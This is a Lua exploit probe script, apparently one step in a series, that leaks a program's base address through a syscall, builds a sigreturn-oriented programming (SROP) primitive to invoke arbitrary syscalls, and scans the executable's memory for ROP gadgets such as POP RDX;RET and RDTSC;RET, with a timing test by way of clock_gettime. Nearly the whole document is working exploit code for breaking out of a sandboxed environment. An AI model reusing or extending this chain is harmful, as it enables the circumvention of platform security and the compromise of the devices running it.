-- CRASH_CLASS: MODERATE
-- PROBE 146c: Analyze found gadgets and test RDTSC in thread
--
-- 146b found: RDTSC at +0x17C42, PREFETCH at +0x5B6DA, MOV_STORE at +0x92C67
-- This probe: 1) reads surrounding bytes to understand gadget context
--             2) scans for POP_RDX and RDTSC;RET in remaining range
--             3) tests RDTSC execution in a child thread

print("=== PROBE 146c: GADGET CONTEXT + RDTSC TEST ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)
local sc_ns = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=" .. string.format("0x%X%08X", ehi, elo))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local function eaddr(off)
    return uint64(string.format("0x%X%08X", ehi, elo + off))
end

local g_ret = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_mov_store = uint64(string.format("0x%X%08X", ehi, elo + 0x92C67))

print("")
print("--- [A] Read gadget context bytes ---")

-- RDTSC at +0x17C42: read 16 bytes around it
print("[A] RDTSC context (+0x17C42):")
for i = 0, 15 do
    local v = safe_rd(eaddr(0x17C42 + i))
    if v then
        io.write(string.format("%02X ", v % 256))
    end
end
print("")

-- PREFETCH at +0x5B6DA: read 8 bytes
print("[A] PREFETCH context (+0x5B6DA):")
for i = 0, 11 do
    local v = safe_rd(eaddr(0x5B6DA + i))
    if v then
        io.write(string.format("%02X ", v % 256))
    end
end
print("")

-- MOV [RDI],RAX;RET at +0x92C67: verify
print("[A] MOV_STORE context (+0x92C67):")
for i = 0, 7 do
    local v = safe_rd(eaddr(0x92C67 + i))
    if v then
        io.write(string.format("%02X ", v % 256))
    end
end
print("")

print("")
print("--- [B] Targeted POP_RDX scan (0x90000-0x180000) ---")
local pop_rdx = nil
for off = 0x90000, 0x180000 - 4, 4 do
    local d = safe_rd(eaddr(off))
    if d == nil then break end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    -- Check all positions for 5A C3
    if (b0 == 0x5A and b1 == 0xC3) then
        pop_rdx = off
        break
    elseif (b1 == 0x5A and b2 == 0xC3) then
        pop_rdx = off + 1
        break
    elseif (b2 == 0x5A) then
        local b3 = math.floor(d / 16777216) % 256
        if b3 == 0xC3 then
            pop_rdx = off + 2
            break
        end
    end
    -- Check boundary: b3 of this + b0 of next
    local b3 = math.floor(d / 16777216) % 256
    if b3 == 0x5A then
        local d2 = safe_rd(eaddr(off + 4))
        if d2 and (d2 % 256) == 0xC3 then
            pop_rdx = off + 3
            break
        end
    end
end
if pop_rdx then
    print("[B] POP_RDX;RET at eboot+0x" .. string.format("%X", pop_rdx))
else
    print("[B] Not found in 0x90000-0x180000, trying 0x0-0x90000")
    for off = 0, 0x90000 - 4, 4 do
        local d = safe_rd(eaddr(off))
        if d == nil then break end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256
        if (b0 == 0x5A and b1 == 0xC3) then pop_rdx = off; break
        elseif (b1 == 0x5A and b2 == 0xC3) then pop_rdx = off + 1; break
        elseif (b2 == 0x5A and b3 == 0xC3) then pop_rdx = off + 2; break
        end
    end
    if pop_rdx then
        print("[B] POP_RDX;RET at eboot+0x" .. string.format("%X", pop_rdx))
    else
        print("[B] POP_RDX;RET NOT FOUND in first 0x180000")
    end
end

print("")
print("--- [C] RDTSC thread test ---")
-- Use RDTSC at +0x17C42 as a gadget even without trailing RET
-- We need to see what follows. But we can make a simpler approach:
-- use SROP to execute RDTSC via sigreturn: set RIP to RDTSC gadget,
-- RSP to a ROP chain that saves the result

-- Actually: rdtsc sets EDX:EAX. We just need rdtsc then a pop/store gadget.
-- Build child thread ROP:
-- 1. RDTSC (0F 31 ...) — whatever follows, we recover via ROP
-- Actually the RDTSC gadget needs to be followed by something safe.
-- Let's check: if +0x17C42 is 0F 31 XX where XX is not C3,
-- we can't use it directly in ROP. We need RDTSC;RET specifically.

-- ALTERNATIVE: Use SROP in child thread to call clock_gettime for timing
-- SROP: set RAX=232 (clock_gettime), RDI=4 (CLOCK_MONOTONIC), RSI=buf
-- This gives nanosecond timing without needing RDTSC gadget

print("[C] Testing clock_gettime timing via SROP thread")

local ts_buf1 = gpu + 0x50000
local ts_buf2 = gpu + 0x50010
local sentinel = gpu + 0x50020
wq(ts_buf1, uint64(0))
wq(ts_buf1 + 8, uint64(0))
wq(ts_buf2, uint64(0))
wq(ts_buf2 + 8, uint64(0))
wq(sentinel, uint64(0xDEADDEADDEADDEAD))

-- Use main thread SROP for clock_gettime
local rv1 = srop(232, uint64(4), ua(ts_buf1))
print("[C] clock_gettime rv=" .. hex(rv1))
local sec1 = safe_rq(ts_buf1)
local nsec1 = safe_rq(ts_buf1 + 8)
print("[C] time1: " .. hex(sec1) .. "s " .. hex(nsec1) .. "ns")

local rv2 = srop(232, uint64(4), ua(ts_buf2))
local sec2 = safe_rq(ts_buf2)
local nsec2 = safe_rq(ts_buf2 + 8)
print("[C] time2: " .. hex(sec2) .. "s " .. hex(nsec2) .. "ns")

if sec1 and nsec1 and sec2 and nsec2 then
    local n1 = to_num(nsec1)
    local n2 = to_num(nsec2)
    local s1 = to_num(sec1)
    local s2 = to_num(sec2)
    local delta_ns = (s2 - s1) * 1000000000 + (n2 - n1)
    print("[C] delta=" .. delta_ns .. " ns (SROP overhead)")
    print("[C] clock_gettime WORKS for timing")
end

print("")
print("--- [D] Quick RDTSC;RET scan (last resort) ---")
-- Search specifically for 0F 31 C3 at 1-byte resolution
-- But optimized: read dword, check if any 3-byte window matches
local rdtsc_ret = nil
for off = 0x180000, 0x2A0000 - 4, 4 do
    local d = safe_rd(eaddr(off))
    if d == nil then break end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    if b0 == 0x0F and b1 == 0x31 and b2 == 0xC3 then
        rdtsc_ret = off; break
    elseif b1 == 0x0F and b2 == 0x31 and b3 == 0xC3 then
        rdtsc_ret = off + 1; break
    end
end
if rdtsc_ret then
    print("[D] RDTSC;RET at eboot+0x" .. string.format("%X", rdtsc_ret))
else
    print("[D] Not found in 0x180000-0x2A0000")
end

print("")
print("--- [E] Test RDTSC via SROP context ---")
-- Alternative: use SROP sigreturn to set RIP=RDTSC instruction,
-- then the sigreturn return lands at RDTSC. But sigreturn replaces
-- the entire register file, so after RDTSC executes, the next instruction
-- (whatever follows in eboot) runs. This is too unpredictable.

-- Better: test if child thread survives executing the RDTSC at +0x17C42
-- Read what follows RDTSC there
local after_rdtsc = {}
for i = 0, 15 do
    local v = safe_rd(eaddr(0x17C42 + i))
    if v then after_rdtsc[i] = v % 256 end
end

-- Print the instruction stream
io.write("[E] +0x17C42: ")
for i = 0, 15 do
    if after_rdtsc[i] then
        io.write(string.format("%02X ", after_rdtsc[i]))
    end
end
print("")

-- Check if there's a RET within reasonable distance
local has_ret_nearby = false
for i = 2, 15 do
    if after_rdtsc[i] == 0xC3 then
        has_ret_nearby = true
        print("[E] RET found at +" .. i .. " bytes after RDTSC")
        break
    end
end

print("")
print("=== PROBE 146c COMPLETE ===")
